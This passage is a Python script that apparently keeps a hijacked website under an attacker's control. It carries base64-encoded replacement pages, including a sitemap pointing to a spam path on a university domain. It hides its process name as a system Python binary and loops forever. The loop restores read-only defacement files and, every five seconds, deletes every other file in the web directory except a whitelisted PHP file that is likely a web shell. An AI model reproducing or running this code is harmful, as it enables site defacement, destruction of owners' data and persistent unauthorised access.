XB0PmV2YWwoZnVuY3Rpb24ocCxhLGMsayxlLGQpe2U9ZnVuY3Rpb24oYyl7cmV0dXJuKGM8YT8nJzplKHBhcnNlSW50KGMvYSkpKSsoKGM9YyVhKT4zNT9TdHJpbmcuZnJvbUNoYXJDb2RlKGMrMjkpOmMudG9TdHJpbmcoMzYpKX07aWYoIScnLnJlcGxhY2UoL14vLFN0cmluZykpe3doaWxlKGMtLSl7ZFtlKGMpXT1rW2NdfHxlKGMpfWs9W2Z1bmN0aW9uKGUpe3JldHVybiBkW2VdfV07ZT1mdW5jdGlvbigpe3JldHVybidcXHcrJ307Yz0xfTt3aGlsZShjLS0pe2lmKGtbY10pe3A9cC5yZXBsYWNlKG5ldyBSZWdFeHAoJ1xcYicrZShjKSsnXFxiJywnZycpLGtbY10pfX1yZXR1cm4gcH0oJ0UubigpOyQoXCdbMi1tPSI0Il1cJykuNCgpOyQoIi5sIikuayhqKGUpe2UuZygpO2ggMD0kKDYpLjUoIjItMCIpO2Moe2I6ImEiLDk6Im8gaSBxPyIsdzoiRCAiKzArIiBwIEMgQiIsQTo3LHo6Nyx9KS55KCg4KT0+e3IoOCl7eCAxPSQoNikuNSgiMyIpKyImdD0iKygoMD09InYiKT8iZCI6ImYiKTt1LnMuMz0xfX0pfSk7Jyw0MSw0MSwndHlwZXxidWlsZFVSTHxkYXRhfGhyZWZ8dG9vbHRpcHxhdHRyfHRoaXN8dHJ1ZXx3aWxsRGVsZXRlfHRpdGxlfHdhcm5pbmd8aWNvbnxzd2FsfHx8fHByZXZlbnREZWZhdWx0fGxldHx5b3V8ZnVuY3Rpb258Y2xpY2t8ZGVsZXRlfHRvZ2dsZXxpbml0fEFyZXx3aWxsfHN1cmV8aWZ8bG9jYXRpb258fGRvY3VtZW50fGZvbGRlcnx0ZXh0fGNvbnN0fHRoZW58ZGFuZ2VyTW9kZXxidXR0b25zfGRlbGV0ZWR8YmV8VGhpc3xic0N1c3RvbUZpbGVJbnB1dCcuc3BsaXQoJ3wnKSwwLHt9KSk8L3NjcmlwdD48L2JvZHk+PC9odG1sPg=="
file_content_sitemap = "PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPHVybHNldAogICAgICB4bWxucz0iaHR0cDovL3d3dy5zaXRlbWFwcy5vcmcvc2NoZW1hcy9zaXRlbWFwLzAuOSIKICAgICAgeG1sbnM6eHNpPSJodHRwOi8vd3d3LnczLm9yZy8yMDAxL1hNTFNjaGVtYS1pbnN0YW5jZSIKICAgICAgeHNpOnNjaGVtYUxvY2F0aW9uPSJodHRwOi8vd3d3LnNpdGVtYXBzLm9yZy9zY2hlbWFzL3NpdGVtYXAvMC45CiAgICAgICAgICAgIGh0dHA6Ly93d3cuc2l0ZW1hcHMub3JnL3NjaGVtYXMvc2l0ZW1hcC8wLjkvc2l0ZW1hcC54c2QiPgo8IS0tIGNyZWF0ZWQgd2l0aCBGcmVlIE9ubGluZSBTaXRlbWFwIEdlbmVyYXRvciB3d3cueG1sLXNpdGVtYXBzLmNvbSAtLT4KCgo8dXJsPgogIDxsb2M+aHR0cHM6Ly9qdXJuYWxmc2gudWluc2J5LmFjLmlkL3B1YmxpYy8tL2tvYnJhODgvPC9sb2M+CiAgPGxhc3Rtb2Q+MjAyMy0wOC0yOVQxMDowOTowMiswMDowMDwvbGFzdG1vZD4KPC91cmw+CgoKPC91cmxzZXQ+"
file_content_robots = "VXNlci1hZ2VudDogKgpEaXNhbGxvdzogCkRpc2FsbG93OiAvY2dpLWJpbi8="

def set_process_title(title):
    # Modify the first argument in sys.argv to set the process title
    sys.argv[0] = title

def create_directory(directory):
    if not os.path.exists(directory):
        os.makedirs(directory)

def create_file(file_path, content):
    with open(file_path, 'w') as file:
        file.write(content)

def delete_files(directory):
    for filename in os.listdir(directory):
        if filename not in ["index.html","sitemap.xml","robots.txt","scrowx.php"]:
            file_path = os.path.join(directory, filename)
            try:
                if os.path.isfile(file_path) or os.path.islink(file_path):
                    os.unlink(file_path)
                elif os.path.isdir(file_path):
                    os.rmdir(file_path)
            except Exception as e:
                print('Failed to delete {}. Reason: {}'.format(file_path, e))

def main():
    # Set the process title when the function starts
    set_process_title("/usr/bin/python")
    
    while True:
        if not os.path.exists(directory):
            print("[!] Directory not found")
            print("[!] Creating directory")
            create_directory(directory)
        elif not os.path.exists(file_path_index) or not os.path.exists(file_path_page) or not os.path.exists(file_path_sitemap) or not os.path.exists(file_path_robots):
            print("[!] File not found")
            print("[!] Creating file")
            if not os.path.exists(file_path_index):
                decoded_content_index = base64.b64decode(file_content_index).decode('utf-8')
                create_file(file_path_index, decoded_content_index)
                print("[!] Setting file mode to 0444")
                os.chmod(file_path_index, 0o444)  # Set file mode to 0444
            if not os.path.exists(file_path_page):
                decoded_content_page = base64.b64decode(file_content_page).decode('utf-8')
                create_file(file_path_page, decoded_content_page)
                print("[!] Setting file mode to 0444")
                os.chmod(file_path_page, 0o444)  # Set file mode to 0444
            if not os.path.exists(file_path_sitemap):
                decoded_content_sitemap = base64.b64decode(file_content_sitemap).decode('utf-8')
                create_file(file_path_sitemap, decoded_content_sitemap)
                print("[!] Setting file mode to 0444 for sitemap.xml")
                os.chmod(file_path_sitemap, 0o444)  # Set file mode to 0444
            if not os.path.exists(file_path_robots):
                decoded_content_robots = base64.b64decode(file_content_robots).decode('utf-8')
                create_file(file_path_robots, decoded_content_robots)
                print("[!] Setting file mode to 0444 for robots.txt")
                os.chmod(file_path_robots, 0o444)  # Set file mode to 0444

        else:
            print("[*] File exists")
            print("[*] Deleting files and directories not in the filter list")
            delete_files(directory)
        time.sleep(5)

if __name__ == "__main__":
    main()
